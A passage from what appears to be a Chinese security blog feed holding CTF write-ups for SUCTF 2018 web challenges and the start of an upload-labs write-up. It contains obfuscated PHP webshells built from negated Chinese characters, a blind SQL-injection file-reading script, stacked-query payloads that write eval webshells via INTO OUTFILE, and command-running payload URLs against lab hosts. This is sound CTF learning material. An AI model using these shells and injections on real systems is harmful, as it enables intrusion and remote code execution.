class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><p>摘自<a href="https://zhuanlan.zhihu.com/p/34947785" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34947785</a></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>string create_function ( string $args , string $code )</p><p>函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称</p><p>看一个官方样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);</span><br><span class="line">echo &quot;New anonymous function: $newfunc\n&quot;;</span><br><span class="line">echo $newfunc(2, M_E) . &quot;\n&quot;;</span><br><span class="line">// outputs</span><br><span class="line">// New anonymous function: lambda_1</span><br><span class="line">// ln(2) + ln(2.718281828459) = 1.6931471805599</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们不难得到create_function()的原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function test($a,$b)</span><br><span class="line">&#123;</span><br><span class="line">return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>摘自<a href="https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw</a></p><blockquote><p>根据题目所给的代码可以看出</p><ol><li>它创建了一个匿名函数<code>$MY</code>,调用$MY时脚本结束并输出flag</li><li>当给func_name用get方式传参时他会通过变量函数的方式调用函数</li></ol><p>在php中匿名函数实际上是有名字的为\00lambda_%d %d为当前apache服务器创建过的匿名函数的数量 实际测试提交5000次请求之后这个值没有超过1250 也就是说服务器会将这个值重置,但是什么时候重置我们不知道,不过这没有关系 可以使用burp向服务器服务器反复提交%00lambda_1来尝试调用这个函数 这里还没有提交不到2000次就得到了flag </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1527696114585.png" alt="1527696114585"></p><p>参考链接</p><p><a href="http://php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.create-function.php</a></p><p><a href="https://www.zybuluo.com/Dukebf/note/715934#信息泄露-phpfinfo" target="_blank" rel="noopener">PHP审计之常见的危险函数及特殊函数</a></p><p><a href="https://paper.seebug.org/94/#_2" target="_blank" rel="noopener">[科普向] 解析create_function() &amp;&amp; 复现wp</a></p><p><a href="https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uijxpzMYE3koc7VpvMyzvw</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484003&amp;idx=1&amp;sn=e27b4e770b3a16245026013545474056&amp;chksm=9760f6b5a0177fa35f21d0260a798a5b774644d45ab74af0e1e74eabbdd4520296a190ada01e&amp;mpshare=1&amp;scene=23&amp;srcid=0528VpCYK8o8P9iyzHwB9thX#rd</a></p><p><a href="https://xr1s.github.io/ctf/hctf-game-week2-writeup/#web" target="_blank" rel="noopener">HCTF GAME Week 2 解题报告</a></p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a><strong>Getshell</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：</p><p>膜一下P神：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p>从这段代码中可以看出对于上传的内容会有一个waf但是这个waf会忽略前5个字符 经过测试没被waf的字符有</p><p><code>[ ] ( ) ~ = ; _ $ .</code>各种非英文字符 前5个字符不会被waf可以用来写&lt;?php 那么像写出这个shell首先要知道三点: </p><blockquote><ol><li>~(X) 当X为一个汉字时对这个汉字取反第二位很大概率得到一个英文字符</li><li>True可以被弱类型为1(所以可以用$[$==$_]来获得1中第二位的英文字符)</li><li>eval是一种语言结构而不是函数，所以不能使用变量函数来调用它.这里可以使用asser代替</li></ol></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530859433842.png" alt="1530859433842"></p><p><strong>坑点:</strong>  使用burp查看什么字符被waf，发现只有[ ] ( ) _可以使用，但是实际可以使用的不止这些,在柠檬师傅的指点下发现burp发包时会默认将; . =等符号默认进行url编码,而由于是文件提交服务端并不会对它进行解码同时%被waf导致我们会误认为这些符号不可用 </p><h4 id="shell-one"><a href="#shell-one" class="headerlink" title="shell one"></a>shell one</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ~茉[$____];<span class="comment">//s</span></span><br><span class="line"><span class="keyword">echo</span> ~内[$____];<span class="comment">//y</span></span><br><span class="line"><span class="keyword">echo</span> ~茉[$____];<span class="comment">//s</span></span><br><span class="line"><span class="keyword">echo</span> ~苏[$____];<span class="comment">//t</span></span><br><span class="line"><span class="keyword">echo</span> ~的[$____];<span class="comment">//e</span></span><br><span class="line"><span class="keyword">echo</span> ~咩[$____];<span class="comment">//m</span></span><br><span class="line"><span class="keyword">echo</span> ~课[$____];<span class="comment">//P</span></span><br><span class="line"><span class="keyword">echo</span> ~尬[$____];<span class="comment">//O</span></span><br><span class="line"><span class="keyword">echo</span> ~笔[$____];<span class="comment">//S</span></span><br><span class="line"><span class="keyword">echo</span> ~端[$____];<span class="comment">//T</span></span><br><span class="line"><span class="keyword">echo</span> ~瞎[$____];<span class="comment">//a</span></span><br></pre></td></tr></table></figure><p>system($_POST[a])</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[];</span><br><span class="line">$__.=$_;</span><br><span class="line">$____=$_==$_;</span><br><span class="line">$___=~茉[$____];</span><br><span class="line">$___.=~内[$____];</span><br><span class="line">$___.=~茉[$____];</span><br><span class="line">$___.=~苏[$____];</span><br><span class="line">$___.=~的[$____];</span><br><span class="line">$___.=~咩[$____];</span><br><span class="line">$_____=_;</span><br><span class="line">$_____.=~课[$____];</span><br><span class="line">$_____.=~尬[$____];</span><br><span class="line">$_____.=~笔[$____];</span><br><span class="line">$_____.=~端[$____];</span><br><span class="line">$__________=$$_____;</span><br><span class="line">$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure><h4 id="shell-two"><a href="#shell-two" class="headerlink" title="shell two"></a>shell two</h4><p><code>assert($_GET[_])</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$______=_;</span><br><span class="line">$_=~(瞰);</span><br><span class="line">$__=$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(范);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(皮);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(半);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(拉);</span><br><span class="line">$__=$__.$_[$_==$_];</span><br><span class="line">$_=~(为);</span><br><span class="line">$___=$_[$_==$_];</span><br><span class="line">$_=~(了);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$_=~(高);</span><br><span class="line">$___=$___.$_[$_==$_];</span><br><span class="line">$___=$______.$___;</span><br><span class="line">$_=$$___;</span><br><span class="line">$__($_[_]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">汉字取反后的第二位对应的英文字母:</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">特==&gt;<span class="number">1</span>=v</span><br><span class="line">瞰==&gt;<span class="number">1</span>=a</span><br><span class="line">皮==&gt;<span class="number">1</span>=e</span><br><span class="line">为==&gt;<span class="number">1</span>=G</span><br><span class="line">高==&gt;<span class="number">1</span>=T</span><br><span class="line">哦==&gt;<span class="number">1</span>=l</span><br><span class="line">了==&gt;<span class="number">1</span>=E</span><br><span class="line">半==&gt;<span class="number">1</span>=r</span><br><span class="line">拉==&gt;<span class="number">1</span>=t</span><br><span class="line">范==&gt;<span class="number">1</span>=s</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.190.128:32770/upload/d0463af12f203844bbecbacbb576e1be.php?_=system(%27cat%20../../../../Th1s_14_f14g%27)</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530856759711.png" alt="1530856759711"></p><p>flag在根目录</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530856712311.png" alt="1530856712311"></p><blockquote><p>SUCTF{fake_flag_web_b} </p></blockquote><h2 id="mutisql"><a href="#mutisql" class="headerlink" title="mutisql"></a>mutisql</h2><p>这里有个地方没搞懂就是 怎么知道<code>secure_file_priv</code>的值为<code>/var/www/</code> </p><blockquote><p><a href="http://192.168.190.128:32771/user/user.php?id=2" target="_blank" rel="noopener">http://192.168.190.128:32771/user/user.php?id=2</a></p></blockquote><p>存在注入，拿起了腹黑师傅的代码改一改在本地运行（<a href="http://www.lovei.org/archives/suctf2018.html）" target="_blank" rel="noopener">http://www.lovei.org/archives/suctf2018.html）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex = <span class="keyword">lambda</span> s: binascii.hexlify(s)</span><br><span class="line">char = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">filename = <span class="string">'/var/www/html/bwvs_config/waf.php'</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://192.168.190.128:32771/user/user.php?id=7-if(hex(load_file(0x%s))like(0x%s),1,2)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        payload = c + i + <span class="string">'%'</span></span><br><span class="line">        _url = url % (hex(filename), hex(payload))</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        <span class="comment"># print _url</span></span><br><span class="line">        r = requests.get(_url, cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'rr102837jt278n11u2sgvi0ll0'</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'user_id:6'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'......'</span> + payload</span><br><span class="line">            c = c + i</span><br><span class="line">                <span class="comment">#if len(c) %2 == 0:</span></span><br><span class="line">                <span class="comment">#    print binascii.unhexlify(c)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">                <span class="comment"># print payload</span></span><br><span class="line">            <span class="comment"># print c</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530882912373.png" alt="1530882912373"></p><p>读取文件：</p><p><code>/var/www/html/bwvs_config/waf.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>user/user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../bwvs_config/sys_config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../header.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ="</span>.<span class="string">"'&#123;$_SESSION['user_name']&#125;'"</span>;</span><br><span class="line">$data = mysqli_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Mysql Error!!'</span>);</span><br><span class="line">$result = mysqli_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'DWVS_user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars($_SESSION[<span class="string">'user_favicon'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE DWVS_user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">$result = mysqli_store_result($connect);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;æ³¨åæ¶é´ï¼"</span>.$row[<span class="number">4</span>].<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">mysqli_free_result($result);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($connect);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="row"&gt;</span><br><span class="line">&lt;div style=<span class="string">"float:left;"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"&lt;?php echo $html_avatar?&gt;"</span> width=</span><br></pre></td></tr></table></figure><p>发现user.php查询id是用<code>mysqli_multi_query</code>，可以执行多条sql语句</p><p>既然waf函数过滤了select，可以用set跟hex编码的方式执行SQL语句，绕过过滤函数 </p><blockquote><p>set @sql = concat(‘create table ‘,newT,’ like ‘,old); </p><p> prepare s1 from @sql;  </p><p>execute s1; </p></blockquote><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.190.128:32771/user/user.php?id=22727;set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.190.128:32771/favicon/wfox.php?55332=system(%27cat%20../../../../WelL_Th1s_14_fl4g%27);</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/SUCTF2018.assets/1530876497015.png" alt="1530876497015"></p><p>姿势2</p><p><a href="http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</a></p><p>先注册一个用户名为:<code>&lt;?php eval($_POST[bdw]);?&gt;</code>,</p><p>在注册一个用户名为:<code>&lt;?php eval($_POST[bdw]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/bdw.php&#39;#</code></p><p>登录第二个用户就写入了shell，然后可以反弹shell，也可以</p><blockquote><p>SUCTF{web_fake_flag_e} </p></blockquote><p>参考链接：</p><p>load_file()和into outfile：<a href="http://wyb0.com/posts/injection-of-mysql-function/" target="_blank" rel="noopener">http://wyb0.com/posts/injection-of-mysql-function/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;annonymous&quot;&gt;&lt;a href=&quot;#annonymous&quot; class=&quot;headerlink&quot; title=&quot;annonymous&quot;&gt;&lt;/a&gt;annonymous&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$MY = create_function(&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;die(`cat flag.php`);&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$hash = bin2hex(openssl_random_pseudo_bytes(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;function SUCTF_$hash()&amp;#123;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;global \$MY;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;\$MY();&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .&lt;span class=&quot;string&quot;&gt;&quot;&amp;#125;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;func_name&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $_GET[&lt;span class=&quot;string&quot;&gt;&quot;func_name&quot;&lt;/span&gt;]();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="web" scheme="http://blog.Lhaihai.wang/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="http://blog.Lhaihai.wang/2018/07/04/upload-labs/"/>
    <id>http://blog.Lhaihai.wang/2018/07/04/upload-labs/</id>
    <published>2018-07-04T10:46:56.000Z</published>
    <updated>2018-07-04T12:29:08.103Z</updated>
    
    <content type="html"><![CDATA[<p>c0ny1师傅写的upload-labs，受益良多</p><a id="more"></a><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/mind-map.png" alt="img"> </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/sum_up.png" alt=""> </p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h4><p>禁用JS代码，</p><p>firefox插件： NoScript</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 